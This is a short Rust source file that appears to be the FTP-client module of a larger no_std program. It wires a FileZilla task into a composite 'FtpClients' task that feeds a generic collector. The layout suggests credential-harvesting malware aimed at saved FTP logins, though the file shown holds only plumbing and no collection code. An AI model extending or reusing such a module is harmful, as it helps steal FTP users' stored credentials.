#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;
mod filezilla;

use crate::filezilla::FileZillaTask;
use alloc::borrow::ToOwned;
use alloc::vec;
use collector::Collector;
use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};

pub struct FtpTask<C: Collector> {
    inner: CompositeTask<C>
}

impl<C: Collector> Default for FtpTask<C> {
    fn default() -> Self {
        Self {
            inner: composite_task!(
                FileZillaTask
            )
        }
    }
}

impl_composite_task_runner!(FtpTask<C>, "FtpClients");